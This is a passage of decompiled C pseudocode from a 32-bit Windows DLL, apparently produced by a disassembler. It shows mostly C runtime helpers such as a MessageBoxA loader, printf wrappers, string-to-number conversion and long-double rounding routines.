  result = a1;
  dword_10092D68 = a1;
  return result;
}
// 10092D68: using guessed type int dword_10092D68;

//----- (1004008E) --------------------------------------------------------
int sub_1004008E()
{
  return 0;
}

//----- (10042CB1) --------------------------------------------------------
int sub_10042CB1()
{
  return _decode_pointer(dword_1009323C);
}
// 1003A70D: using guessed type _DWORD __cdecl _decode_pointer(_DWORD);
// 1009323C: using guessed type int dword_1009323C;

//----- (100430BD) --------------------------------------------------------
LONG __cdecl sub_100430BD(LONG a1)
{
  LONG result; // eax

  result = a1;
  Target = a1;
  return result;
}

//----- (100431CB) --------------------------------------------------------
int __cdecl sub_100431CB(int a1)
{
  int result; // eax

  result = a1;
  dword_1009324C = a1;
  return result;
}
// 1009324C: using guessed type int dword_1009324C;

//----- (10043CBC) --------------------------------------------------------
int sub_10043CBC()
{
  return 1;
}

//----- (10043CC0) --------------------------------------------------------
char __thiscall sub_10043CC0(_BYTE *this)
{
  return this[8];
}

//----- (10043CDF) --------------------------------------------------------
int __thiscall sub_10043CDF(_DWORD *this)
{
  return this[3];
}

//----- (10043D37) --------------------------------------------------------
int __thiscall sub_10043D37(_DWORD *this)
{
  return this[3];
}

//----- (100487A5) --------------------------------------------------------
int __cdecl sub_100487A5(int a1, int a2, int a3)
{
  HMODULE LibraryA; // eax
  HMODULE v4; // edi
  int (__stdcall *MessageBoxA)(HWND, LPCSTR, LPCSTR, UINT); // eax
  HWND (__stdcall *GetActiveWindow)(); // eax
  HWND (__stdcall *GetLastActivePopup)(HWND); // eax
  BOOL (__stdcall *GetUserObjectInformationA)(HANDLE, int, PVOID, DWORD, LPDWORD); // eax
  HWINSTA (__stdcall *GetProcessWindowStation)(); // eax
  int (*v10)(void); // esi
  int (__stdcall *v11)(int, int, char *, int, char *); // eax
  int (__stdcall *v12)(int, int, char *, int, char *); // edi
  int v13; // eax
  int (*v14)(void); // eax
  int (__stdcall *v15)(int); // eax
  int (__stdcall *v16)(int, int, int, int); // eax
  char v18[12]; // [esp+10h] [ebp-20h] BYREF
  char v19[4]; // [esp+1Ch] [ebp-14h] BYREF
  unsigned int v20; // [esp+20h] [ebp-10h] BYREF
  int v21; // [esp+24h] [ebp-Ch] BYREF
  int v22; // [esp+28h] [ebp-8h]
  int v23; // [esp+2Ch] [ebp-4h]

  v22 = _encoded_null();
  v23 = 0;
  v21 = 0;
  v20 = 0;
  if ( !dword_1009328C )
  {
    LibraryA = LoadLibraryA("USER32.DLL");
    v4 = LibraryA;
    if ( !LibraryA )
      return 0;
    MessageBoxA = (int (__stdcall *)(HWND, LPCSTR, LPCSTR, UINT))GetProcAddress(LibraryA, "MessageBoxA");
    if ( !MessageBoxA )
      return 0;
    dword_1009328C = _encode_pointer(MessageBoxA);
    GetActiveWindow = (HWND (__stdcall *)())GetProcAddress(v4, "GetActiveWindow");
    dword_10093290 = _encode_pointer(GetActiveWindow);
    GetLastActivePopup = (HWND (__stdcall *)(HWND))GetProcAddress(v4, "GetLastActivePopup");
    dword_10093294 = _encode_pointer(GetLastActivePopup);
    if ( sub_1003AF4B(&v21) )
      _invoke_watson(0, 0, 0, 0, 0);
    if ( v21 == 2 )
    {
      GetUserObjectInformationA = (BOOL (__stdcall *)(HANDLE, int, PVOID, DWORD, LPDWORD))GetProcAddress(
                                                                                            v4,
                                                                                            "GetUserObjectInformationA");
      dword_1009329C = _encode_pointer(GetUserObjectInformationA);
      if ( dword_1009329C )
      {
        GetProcessWindowStation = (HWINSTA (__stdcall *)())GetProcAddress(v4, "GetProcessWindowStation");
        dword_10093298 = _encode_pointer(GetProcessWindowStation);
      }
    }
  }
  if ( dword_10093298 == v22
    || dword_1009329C == v22
    || (v10 = (int (*)(void))_decode_pointer(dword_10093298),
        v11 = (int (__stdcall *)(int, int, char *, int, char *))_decode_pointer(dword_1009329C),
        v12 = v11,
        !v10)
    || !v11
    || (v13 = v10()) != 0 && v12(v13, 1, v18, 12, v19) && (v18[8] & 1) != 0 )
  {
    if ( dword_10093290 != v22 )
    {
      v14 = (int (*)(void))_decode_pointer(dword_10093290);
      if ( v14 )
      {
        v23 = v14();
        if ( v23 )
        {
          if ( dword_10093294 != v22 )
          {
            v15 = (int (__stdcall *)(int))_decode_pointer(dword_10093294);
            if ( v15 )
              v23 = v15(v23);
          }
        }
      }
    }
  }
  else
  {
    if ( sub_1003AFFA(&v20) )
      _invoke_watson(0, 0, 0, 0, 0);
    if ( v20 < 4 )
      a3 |= 0x40000u;
    else
      a3 |= 0x200000u;
  }
  v16 = (int (__stdcall *)(int, int, int, int))_decode_pointer(dword_1009328C);
  if ( v16 )
    return v16(v23, a1, a2, a3);
  return 0;
}
// 1003A696: using guessed type _DWORD __cdecl _encode_pointer(_DWORD);
// 1003A704: using guessed type int _encoded_null(void);
// 1003A70D: using guessed type _DWORD __cdecl _decode_pointer(_DWORD);
// 1009328C: using guessed type int dword_1009328C;
// 10093290: using guessed type int dword_10093290;
// 10093294: using guessed type int dword_10093294;
// 10093298: using guessed type int dword_10093298;
// 1009329C: using guessed type int dword_1009329C;
// 100487A5: using guessed type char var_14[4];

//----- (100495F8) --------------------------------------------------------
void sub_100495F8()
{
  dword_10096864 = 0;
}
// 10096864: using guessed type int dword_10096864;

//----- (10049EE0) --------------------------------------------------------
void **sub_10049EE0()
{
  return &off_1008DBD0;
}
// 1008DBD0: using guessed type void *off_1008DBD0;

//----- (1004ADE8) --------------------------------------------------------
int sub_1004ADE8()
{
  void **v0; // eax

  v0 = sub_10049EE0();
  return _unlock_file2(1, v0 + 8);
}
// 1004A057: using guessed type _DWORD __cdecl _unlock_file2(_DWORD, _DWORD);

//----- (1004CDA8) --------------------------------------------------------
int sub_1004CDA8()
{
  dword_10096890 = _get_sse2_info();
  return 0;
}
// 1004CD48: using guessed type int _get_sse2_info(void);
// 10096890: using guessed type int dword_10096890;

//----- (1004E3F8) --------------------------------------------------------
int sub_1004E3F8()
{
  return 0;
}

//----- (10050B5E) --------------------------------------------------------
int sub_10050B5E()
{
  return _unlock(3);
}
// 100414F6: using guessed type _DWORD __cdecl _unlock(_DWORD);

//----- (10050DD7) --------------------------------------------------------
int sub_10050DD7()
{
  return flsall(1);
}
// 10050CAA: using guessed type _DWORD __cdecl flsall(_DWORD);

//----- (1005129E) --------------------------------------------------------
int __cdecl sub_1005129E(int a1, int a2, int a3)
{
  return vprintf_helper(_output_l, a1, a2, a3);
}
// 1005120E: using guessed type _DWORD __cdecl vprintf_helper(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (100512B8) --------------------------------------------------------
int __cdecl sub_100512B8(int a1, int a2, int a3)
{
  return vprintf_helper(_output_s_l, a1, a2, a3);
}
// 1005120E: using guessed type _DWORD __cdecl vprintf_helper(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (100512D2) --------------------------------------------------------
int __cdecl sub_100512D2(int a1, int a2, int a3)
{
  return vprintf_helper(_output_p_l, a1, a2, a3);
}
// 1005120E: using guessed type _DWORD __cdecl vprintf_helper(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (10052794) --------------------------------------------------------
unsigned int __cdecl sub_10052794(char *a1, char **a2, int a3, struct localeinfo_struct *a4)
{
  return strtoxl(a4, a1, (const char **)a2, a3, 0);
}

//----- (100527F4) --------------------------------------------------------
int __cdecl sub_100527F4(_DWORD *a1)
{
  if ( a1 )
  {
    *a1 = dword_1008DF8C;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter(0, 0, 0, 0, 0);
    return 22;
  }
}
// 1003CA7A: using guessed type int __cdecl _invalid_parameter(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1008DF8C: using guessed type int dword_1008DF8C;

//----- (10052828) --------------------------------------------------------
int __cdecl sub_10052828(_DWORD *a1)
{
  if ( a1 )
  {
    *a1 = dword_1008DF90;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter(0, 0, 0, 0, 0);
    return 22;
  }
}
// 1003CA7A: using guessed type int __cdecl _invalid_parameter(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1008DF90: using guessed type int dword_1008DF90;

//----- (1005285C) --------------------------------------------------------
int __cdecl sub_1005285C(_DWORD *a1)
{
  if ( a1 )
  {
    *a1 = dword_1008DF88;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter(0, 0, 0, 0, 0);
    return 22;
  }
}
// 1003CA7A: using guessed type int __cdecl _invalid_parameter(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1008DF88: using guessed type int dword_1008DF88;

//----- (10052932) --------------------------------------------------------
int *sub_10052932()
{
  return &dword_1008DF8C;
}
// 1008DF8C: using guessed type int dword_1008DF8C;

//----- (10052938) --------------------------------------------------------
int *sub_10052938()
{
  return &dword_1008DF90;
}
// 1008DF90: using guessed type int dword_1008DF90;

//----- (1005293E) --------------------------------------------------------
int *sub_1005293E()
{
  return &dword_1008DF88;
}
// 1008DF88: using guessed type int dword_1008DF88;

//----- (10052944) --------------------------------------------------------
void **sub_10052944()
{
  return &off_1008E018;
}
// 1008E018: using guessed type void *off_1008E018;

//----- (10053909) --------------------------------------------------------
unsigned __int64 __cdecl sub_10053909(char *a1, char **a2, int a3, struct localeinfo_struct *a4)
{
  return strtoxq(a4, a1, (const char **)a2, a3, 0);
}

//----- (10053DD3) --------------------------------------------------------
int sub_10053DD3()
{
  return _unlock(7);
}
// 100414F6: using guessed type _DWORD __cdecl _unlock(_DWORD);

//----- (10055017) --------------------------------------------------------
void __thiscall sub_10055017(void *this)
{
  *(_DWORD *)this = &ikc::rnp_nhgjjqmxr::`vftable';
  sub_1003A301(this);
}
// 10072924: using guessed type void *ikc::rnp_nhgjjqmxr::`vftable';

//----- (10055022) --------------------------------------------------------
_DWORD *__thiscall sub_10055022(_DWORD *Block, char a2)
{
  *Block = &ikc::rnp_nhgjjqmxr::`vftable';
  sub_1003A301(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10072924: using guessed type void *ikc::rnp_nhgjjqmxr::`vftable';

//----- (100560BB) --------------------------------------------------------
std::exception *__thiscall sub_100560BB(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &ikc::rnp_nhgjjqmxr::`vftable';
  return this;
}
// 10072924: using guessed type void *ikc::rnp_nhgjjqmxr::`vftable';

//----- (10056753) --------------------------------------------------------
void sub_10056753()
{
  ;
}

//----- (10056762) --------------------------------------------------------
void sub_10056762()
{
  ;
}

//----- (1005740D) --------------------------------------------------------
int __cdecl sub_1005740D(_DWORD *a1, int a2, struct localeinfo_struct *a3)
{
  int v3; // eax
  char v6[4]; // [esp+Ch] [ebp-28h] BYREF
  char v7[8]; // [esp+10h] [ebp-24h] BYREF
  int v8; // [esp+18h] [ebp-1Ch]
  char v9; // [esp+1Ch] [ebp-18h]
  int v10; // [esp+20h] [ebp-14h]
  unsigned __int16 v11[6]; // [esp+24h] [ebp-10h] BYREF

  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v7, a3);
  v10 = __strgtold12_l(v11, v6, a2, 0, 0, 0, 0, v7);
  v3 = sub_100581A8(v11, a1);
  if ( (v10 & 3) != 0 )
  {
    if ( (v10 & 1) != 0 )
      goto LABEL_8;
    if ( (v10 & 2) != 0 )
      goto LABEL_3;
  }
  else
  {
    if ( v3 == 1 )
    {
LABEL_3:
      if ( v9 )
        *(_DWORD *)(v8 + 112) &= ~2u;
      return 3;
    }
    if ( v3 == 2 )
    {
LABEL_8:
      if ( v9 )
        *(_DWORD *)(v8 + 112) &= ~2u;
      return 4;
    }
  }
  if ( v9 )
    *(_DWORD *)(v8 + 112) &= ~2u;
  return 0;
}
// 100592C6: using guessed type _DWORD __cdecl __strgtold12_l(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1005740D: using guessed type char var_28[4];
// 1005740D: using guessed type unsigned __int16 var_10[6];

//----- (10057580) --------------------------------------------------------
int __cdecl sub_10057580(_DWORD *a1, int a2, struct localeinfo_struct *a3)
{
  int v3; // eax
  char v6[4]; // [esp+Ch] [ebp-28h] BYREF
  char v7[8]; // [esp+10h] [ebp-24h] BYREF
  int v8; // [esp+18h] [ebp-1Ch]
  char v9; // [esp+1Ch] [ebp-18h]
  int v10; // [esp+20h] [ebp-14h]
  unsigned __int16 v11[6]; // [esp+24h] [ebp-10h] BYREF

  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v7, a3);
  v10 = __strgtold12_l(v11, v6, a2, 0, 0, 0, 0, v7);
  v3 = sub_100586EA(v11, a1);
  if ( (v10 & 3) != 0 )
  {
    if ( (v10 & 1) != 0 )
      goto LABEL_8;
    if ( (v10 & 2) != 0 )
      goto LABEL_3;
  }
  else
  {
    if ( v3 == 1 )
    {
LABEL_3:
      if ( v9 )
        *(_DWORD *)(v8 + 112) &= ~2u;
      return 3;
    }
    if ( v3 == 2 )
    {
LABEL_8:
      if ( v9 )
        *(_DWORD *)(v8 + 112) &= ~2u;
      return 4;
    }
  }
  if ( v9 )
    *(_DWORD *)(v8 + 112) &= ~2u;
  return 0;
}
// 100592C6: using guessed type _DWORD __cdecl __strgtold12_l(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 10057580: using guessed type char var_28[4];
// 10057580: using guessed type unsigned __int16 var_10[6];

//----- (100581A8) --------------------------------------------------------
int __cdecl sub_100581A8(unsigned __int16 *a1, _DWORD *a2)
{
  unsigned __int16 v2; // bx
  int v3; // ebx
  int v4; // eax
  int v5; // ebx
  int v6; // eax
  int result; // eax
  int v8; // esi
  int *v9; // edi
  int v10; // eax
  bool i; // zf
  int v12; // eax
  unsigned int v13; // edx
  int *v14; // ecx
  bool v15; // cf
  unsigned int v16; // esi
  int v17; // eax
  int v18; // edx
  int *v19; // ebx
  unsigned int v20; // esi
  char v21; // cl
  int v22; // edx
  int *v23; // ecx
  int v24; // esi
  int v25; // eax
  int *v26; // ebx
  bool j; // zf
  int v28; // eax
  unsigned int v29; // edx
  int *v30; // ecx
  unsigned int v31; // edi
  int k; // ecx
  int *v33; // ecx
  unsigned int v34; // esi
  int v35; // edi
  int v36; // eax
  int v37; // edx
  int *v38; // ebx
  unsigned int v39; // esi
  char v40; // cl
  int v41; // edx
  int *v42; // ecx
  int v43; // eax
  int v44; // edx
  int *v45; // ebx
  unsigned int v46; // esi
  char v47; // cl
  int v48; // edx
  int *v49; // ecx
  int v50; // eax
  int v51; // edx
  unsigned int v52; // edi
  int v53; // edx
  int *v54; // ecx
  unsigned int v55; // ebx
  int v56; // edx
  int v57; // [esp+8h] [ebp-2Ch]
  int v58; // [esp+Ch] [ebp-28h]
  int v59; // [esp+10h] [ebp-24h]
  int v60; // [esp+14h] [ebp-20h] BYREF
  int v61; // [esp+18h] [ebp-1Ch]
  int v62; // [esp+1Ch] [ebp-18h] BYREF
  int v63; // [esp+20h] [ebp-14h]
  int v64; // [esp+24h] [ebp-10h]
  int v65; // [esp+28h] [ebp-Ch]
  int v66; // [esp+2Ch] [ebp-8h]
  int v67; // [esp+30h] [ebp-4h]
  int v68; // [esp+3Ch] [ebp+8h]
  unsigned int v69; // [esp+3Ch] [ebp+8h]
  int v70; // [esp+3Ch] [ebp+8h]
  int v71; // [esp+3Ch] [ebp+8h]
  int v72; // [esp+3Ch] [ebp+8h]
  int v73; // [esp+3Ch] [ebp+8h]
  int v74; // [esp+3Ch] [ebp+8h]

  v2 = a1[5];
  v63 = v2 & 0x8000;
  v60 = *(_DWORD *)(a1 + 3);
  v3 = (v2 & 0x7FFF) - 0x3FFF;
  v4 = *a1 << 16;
  v61 = *(_DWORD *)(a1 + 1);
  v62 = v4;
  if ( v3 != -16383 )
  {
    v68 = 0;
    v57 = v60;
    v58 = v61;
    v59 = v62;
    v8 = dword_10092458 - 1;
    v64 = v3;
    v65 = dword_10092458 / 32;
    v9 = &v60 + dword_10092458 / 32;
    v66 = 31 - dword_10092458 % 32;
    if ( ((1 << (31 - dword_10092458 % 32)) & *v9) != 0 )
    {
      v10 = v65;
      for ( i = (~(-1 << (31 - dword_10092458 % 32)) & *(&v60 + v65)) == 0; i; i = *(&v60 + v10) == 0 )
      {
        if ( ++v10 >= 3 )
          goto LABEL_22;
      }
      v12 = v8 / 32;
      v67 = 0;
      v13 = 1 << (31 - v8 % 32);
      v14 = &v60 + v8 / 32;
      v69 = v13 + *v14;
      if ( v69 >= *v14 )
      {
        v15 = v69 < v13;
        goto LABEL_18;
      }
LABEL_19:
      v67 = 1;
      while ( 1 )
      {
        --v12;
        *v14 = v69;
        if ( v12 < 0 || !v67 )
          break;
        v67 = 0;
        v14 = &v60 + v12;
        v16 = *v14 + 1;
        v69 = v16;
        if ( v16 >= *v14 )
        {
          v15 = v16 == 0;
LABEL_18:
          if ( !v15 )
            continue;
        }
        goto LABEL_19;
      }
      v68 = v67;
    }
LABEL_22:
    *v9 &= -1 << v66;
    if ( v65 + 1 < 3 )
      memset(&v60 + v65 + 1, 0, 4 * (3 - (v65 + 1)));
    if ( v68 )
      ++v3;
    if ( v3 >= dword_10092454 - dword_10092458 )
    {
      if ( v3 > dword_10092454 )
      {
        if ( v3 < dword_10092450 )
        {
          v60 &= ~0x80000000;
          v5 = dword_10092464 + v3;
          v50 = dword_1009245C / 32;
          v51 = dword_1009245C % 32;
          v65 = 0;
          v74 = 0;
          v67 = 32 - dword_1009245C % 32;
          do
          {
            v52 = *(&v60 + v74);
            v64 = ~(-1 << v51) & v52;
            *(&v60 + v74++) = v65 | (v52 >> v51);
            v65 = v64 << v67;
          }
          while ( v74 < 3 );
          v53 = 2;
          v54 = &v62 - v50;
          do
          {
            if ( v53 < v50 )
              *(&v60 + v53) = 0;
            else
              *(&v60 + v53) = *v54;
            --v53;
            --v54;
          }
          while ( v53 >= 0 );
          result = 0;
        }
        else
        {
          v61 = 0;
          v62 = 0;
          v60 = 0x80000000;
          v43 = dword_1009245C / 32;
          v44 = dword_1009245C % 32;
          v65 = 0;
          v73 = 0;
          v67 = 32 - dword_1009245C % 32;
          do
          {
            v45 = &v60 + v73;
            v46 = *v45;
            v64 = ~(-1 << v44) & *v45;
            v47 = v67;
            *v45 = v65 | (v46 >> v44);
            ++v73;
            v65 = v64 << v47;
          }
          while ( v73 < 3 );
          v48 = 2;
          v49 = &v62 - v43;
          do
          {
            if ( v48 < v43 )
              *(&v60 + v48) = 0;
            else
              *(&v60 + v48) = *v49;
            --v48;
            --v49;
          }
          while ( v48 >= 0 );
          v5 = dword_10092464 + dword_10092450;
          result = 1;
        }
        goto LABEL_79;
      }
      v60 = v57;
      v61 = v58;
      v17 = (dword_10092454 - v64) / 32;
      v62 = v59;
      v18 = (dword_10092454 - v64) % 32;
      v65 = 0;
      v70 = 0;
      v67 = 32 - v18;
      do
      {
        v19 = &v60 + v70;
        v20 = *v19;
        v64 = ~(-1 << v18) & *v19;
        v21 = v67;
        *v19 = v65 | (v20 >> v18);
        ++v70;
        v65 = v64 << v21;
      }
      while ( v70 < 3 );
      v22 = 2;
      v23 = &v62 - v17;
      do
      {
        if ( v22 < v17 )
          *(&v60 + v22) = 0;
        else
          *(&v60 + v22) = *v23;
        --v22;
        --v23;
      }
      while ( v22 >= 0 );
      v24 = dword_10092458 - 1;
      v25 = dword_10092458 / 32;
      v65 = dword_10092458 / 32;
      v26 = &v60 + dword_10092458 / 32;
      v64 = 31 - dword_10092458 % 32;
      if ( ((1 << (31 - dword_10092458 % 32)) & *v26) != 0 )
      {
        for ( j = (~(-1 << (31 - dword_10092458 % 32)) & *(&v60 + v25)) == 0; j; j = *(&v60 + v25) == 0 )
        {
          if ( ++v25 >= 3 )
            goto LABEL_52;
        }
        v28 = v24 / 32;
        v71 = 0;
        v29 = 1 << (31 - v24 % 32);
        v30 = &v60 + v24 / 32;
        v31 = *v30 + v29;
        if ( v31 < *v30 || v31 < v29 )
          v71 = 1;
        *v30 = v31;
        for ( k = v71; --v28 >= 0 && k; k = v35 )
        {
          v33 = &v60 + v28;
          v34 = *v33 + 1;
          v35 = 0;
          if ( v34 < *v33 || *v33 == -1 )
            v35 = 1;
          *v33 = v34;
        }
      }
LABEL_52:
      *v26 &= -1 << v64;
      if ( v65 + 1 < 3 )
        memset(&v60 + v65 + 1, 0, 4 * (3 - (v65 + 1)));
      v36 = (dword_1009245C + 1) / 32;
      v37 = (dword_1009245C + 1) % 32;
      v65 = 0;
      v72 = 0;
      v67 = 32 - v37;
      do
      {
        v38 = &v60 + v72;
        v39 = *v38;
        v64 = ~(-1 << v37) & *v38;
        v40 = v67;
        *v38 = v65 | (v39 >> v37);
        ++v72;
        v65 = v64 << v40;
      }
      while ( v72 < 3 );
      v41 = 2;
      v42 = &v62 - v36;
      do
      {
        if ( v41 < v36 )
          *(&v60 + v41) = 0;
        else
          *(&v60 + v41) = *v42;
        --v41;
        --v42;
      }
      while ( v41 >= 0 );
    }
    else
    {
      v60 = 0;
      v61 = 0;
      v62 = 0;
    }
    v5 = 0;
    result = 2;
    goto LABEL_79;
  }
  v5 = 0;
  v6 = 0;
  while ( !*(&v60 + v6) )
  {
    if ( ++v6 >= 3 )
    {
      result = 0;
      goto LABEL_79;
    }
  }
  v60 = 0;
  v61 = 0;
  v62 = 0;
  result = 2;
LABEL_79:
  v55 = v60 | (v63 != 0 ? 0x80000000 : 0) | (v5 << (31 - dword_1009245C));
  if ( dword_10092460 == 64 )
  {
    v56 = v61;
    a2[1] = v55;
    *a2 = v56;
  }
  else if ( dword_10092460 == 32 )
  {
    *a2 = v55;
  }
  return result;
}
// 10092450: using guessed type int dword_10092450;
// 10092454: using guessed type int dword_10092454;
// 10092458: using guessed type int dword_10092458;
// 1009245C: using guessed type int dword_1009245C;
// 10092460: using guessed type int dword_10092460;
// 10092464: using guessed type int dword_10092464;

//----- (100586EA) --------------------------------------------------------
int __cdecl sub_100586EA(unsigned __int16 *a1, _DWORD *a2)
{
  unsigned __int16 v2; // bx
  int v3; // ebx
  int v4; // eax
  int v5; // ebx
  int v6; // eax
  int result; // eax
  int v8; // esi
  int *v9; // edi
  int v10; // eax
  bool i; // zf
  int v12; // eax
  unsigned int v13; // edx
  int *v14; // ecx
  bool v15; // cf
  unsigned int v16; // esi
  int v17; // eax
  int v18; // edx
  int *v19; // ebx
  unsigned int v20; // esi
  char v21; // cl
  int v22; // edx
  int *v23; // ecx
  int v24; // esi
  int v25; // eax
  int *v26; // ebx
  bool j; // zf
  int v28; // eax
  unsigned int v29; // edx
  int *v30; // ecx
  unsigned int v31; // edi
  int k; // ecx
  int *v33; // ecx
  unsigned int v34; // esi
  int v35; // edi
  int v36; // eax
  int v37; // edx
  int *v38; // ebx
  unsigned int v39; // esi
  char v40; // cl
  int v41; // edx
  int *v42; // ecx
  int v43; // eax
  int v44; // edx
  int *v45; // ebx
  unsigned int v46; // esi
  char v47; // cl
  int v48; // edx
  int *v49; // ecx
  int v50; // eax
  int v51; // edx
  unsigned int v52; // edi
  int v53; // edx
  int *v54; // ecx
  unsigned int v55; // ebx
  int v56; // edx
  int v57; // [esp+8h] [ebp-2Ch]
  int v58; // [esp+Ch] [ebp-28h]
  int v59; // [esp+10h] [ebp-24h]
  int v60; // [esp+14h] [ebp-20h] BYREF
  int v61; // [esp+18h] [ebp-1Ch]
  int v62; // [esp+1Ch] [ebp-18h] BYREF
  int v63; // [esp+20h] [ebp-14h]
  int v64; // [esp+24h] [ebp-10h]
  int v65; // [esp+28h] [ebp-Ch]
  int v66; // [esp+2Ch] [ebp-8h]
  int v67; // [esp+30h] [ebp-4h]
  int v68; // [esp+3Ch] [ebp+8h]
  unsigned int v69; // [esp+3Ch] [ebp+8h]
  int v70; // [esp+3Ch] [ebp+8h]
  int v71; // [esp+3Ch] [ebp+8h]
  int v72; // [esp+3Ch] [ebp+8h]
  int v73; // [esp+3Ch] [ebp+8h]
  int v74; // [esp+3Ch] [ebp+8h]

  v2 = a1[5];
  v63 = v2 & 0x8000;
  v60 = *(_DWORD *)(a1 + 3);
  v3 = (v2 & 0x7FFF) - 0x3FFF;
  v4 = *a1 << 16;
  v61 = *(_DWORD *)(a1 + 1);
  v62 = v4;
  if ( v3 != -16383 )
  {
    v68 = 0;
    v57 = v60;
    v58 = v61;
    v59 = v62;
    v8 = dword_10092470 - 1;
    v64 = v3;
    v65 = dword_10092470 / 32;
    v9 = &v60 + dword_10092470 / 32;
    v66 = 31 - dword_10092470 % 32;
    if ( ((1 << (31 - dword_10092470 % 32)) & *v9) != 0 )
    {
      v10 = v65;
      for ( i = (~(-1 << (31 - dword_10092470 % 32)) & *(&v60 + v65)) == 0; i; i = *(&v60 + v10) == 0 )
      {
        if ( ++v10 >= 3 )
          goto LABEL_22;
      }
      v12 = v8 / 32;
      v67 = 0;
      v13 = 1 << (31 - v8 % 32);
      v14 = &v60 + v8 / 32;
      v69 = v13 + *v14;
      if ( v69 >= *v14 )
      {
        v15 = v69 < v13;
        goto LABEL_18;
      }
LABEL_19:
      v67 = 1;
      while ( 1 )
      {
        --v12;
        *v14 = v69;
        if ( v12 < 0 || !v67 )
          break;
        v67 = 0;
        v14 = &v60 + v12;
        v16 = *v14 + 1;
        v69 = v16;
        if ( v16 >= *v14 )
        {
          v15 = v16 == 0;
LABEL_18:
          if ( !v15 )
            continue;
        }
        goto LABEL_19;
      }
      v68 = v67;
    }
LABEL_22:
    *v9 &= -1 << v66;
    if ( v65 + 1 < 3 )
      memset(&v60 + v65 + 1, 0, 4 * (3 - (v65 + 1)));
    if ( v68 )
      ++v3;
    if ( v3 >= dword_1009246C - dword_10092470 )
    {
      if ( v3 > dword_1009246C )
      {
        if ( v3 < dword_10092468 )
        {
          v60 &= ~0x80000000;
          v5 = dword_1009247C + v3;
          v50 = dword_10092474 / 32;
          v51 = dword_10092474 % 32;
          v65 = 0;
          v74 = 0;
          v67 = 32 - dword_10092474 % 32;
          do
          {
            v52 = *(&v60 + v74);
            v64 = ~(-1 << v51) & v52;
            *(&v60 + v74++) = v65 | (v52 >> v51);
            v65 = v64 << v67;
          }
          while ( v74 < 3 );
          v53 = 2;
          v54 = &v62 - v50;
          do
          {
            if ( v53 < v50 )
              *(&v60 + v53) = 0;
            else
              *(&v60 + v53) = *v54;
            --v53;
            --v54;
          }
          while ( v53 >= 0 );
          result = 0;
        }
        else
        {
          v61 = 0;
          v62 = 0;
          v60 = 0x80000000;
          v43 = dword_10092474 / 32;
          v44 = dword_10092474 % 32;
          v65 = 0;
          v73 = 0;
          v67 = 32 - dword_10092474 % 32;
          do
          {
            v45 = &v60 + v73;
            v46 = *v45;
            v64 = ~(-1 << v44) & *v45;
            v47 = v67;
            *v45 = v65 | (v46 >> v44);
            ++v73;
            v65 = v64 << v47;
          }
          while ( v73 < 3 );
          v48 = 2;
          v49 = &v62 - v43;
          do
          {
            if ( v48 < v43 )
              *(&v60 + v48) = 0;
            else
              *(&v60 + v48) = *v49;
            --v48;
            --v49;
          }
          while ( v48 >= 0 );
          v5 = dword_1009247C + dword_10092468;
          result = 1;
        }
        goto LABEL_79;
      }
      v60 = v57;
      v61 = v58;
      v17 = (dword_1009246C - v64) / 32;
      v62 = v59;
      v18 = (dword_1009246C - v64) % 32;
      v65 = 0;
      v70 = 0;
      v67 = 32 - v18;
      do
      {
        v19 = &v60 + v70;
        v20 = *v19;
        v64 = ~(-1 << v18) & *v19;
        v21 = v67;
        *v19 = v65 | (v20 >> v18);
        ++v70;
        v65 = v64 << v21;
      }
      while ( v70 < 3 );
      v22 = 2;
      v23 = &v62 - v17;
      do
      {
        if ( v22 < v17 )
          *(&v60 + v22) = 0;
        else
          *(&v60 + v22) = *v23;
        --v22;
        --v23;
      }
      while ( v22 >= 0 );
      v24 = dword_10092470 - 1;
      v25 = dword_10092470 / 32;
      v65 = dword_10092470 / 32;
      v26 = &v60 + dword_10092470 / 32;
      v64 = 31 - dword_10092470 % 32;
      if ( ((1 << (31 - dword_10092470 % 32)) & *v26) != 0 )
      {
        for ( j = (~(-1 << (31 - dword_10092470 % 32)) & *(&v60 + v25)) == 0; j; j = *(&v60 + v25) == 0 )
        {
          if ( ++v25 >= 3 )
            goto LABEL_52;
        }
        v28 = v24 / 32;
        v71 = 0;
        v29 = 1 << (31 - v24 % 32);
        v30 = &v60 + v24 / 32;
        v31 = *v30 + v29;
        if ( v31 < *v30 || v31 < v29 )
          v71 = 1;
        *v30 = v31;
        for ( k = v71; --v28 >= 0 && k; k = v35 )
        {
          v33 = &v60 + v28;
          v34 = *v33 + 1;
          v35 = 0;
          if ( v34 < *v33 || *v33 == -1 )
            v35 = 1;
          *v33 = v34;
        }
      }
LABEL_52:
      *v26 &= -1 << v64;
      if ( v65 + 1 < 3 )
        memset(&v60 + v65 + 1, 0, 4 * (3 - (v65 + 1)));
      v36 = (dword_10092474 + 1) / 32;
      v37 = (dword_10092474 + 1) % 32;
      v65 = 0;
      v72 = 0;
      v67 = 32 - v37;
      do
      {
        v38 = &v60 + v72;
        v39 = *v38;
        v64 = ~(-1 << v37) & *v38;
        v40 = v67;
        *v38 = v65 | (v39 >> v37);
        ++v72;
        v65 = v64 << v40;
      }
      while ( v72 < 3 );
      v41 = 2;
      v42 = &v62 - v36;
      do
      {
        if ( v41 < v36 )
          *(&v60 + v41) = 0;
        else
          *(&v60 + v41) = *v42;
        --v41;
        --v42;
      }
      while ( v41 >= 0 );
    }
    else
    {
      v60 = 0;
      v61 = 0;
      v62 = 0;
    }
    v5 = 0;
    result = 2;
    goto LABEL_79;
  }
  v5 = 0;
  v6 = 0;
  while ( !*(&v60 + v6) )
  {
    if ( ++v6 >= 3 )
    {
      result = 0;
      goto LABEL_79;
    }
  }
  v60 = 0;
  v61 = 0;
  v62 = 0;
  result = 2;
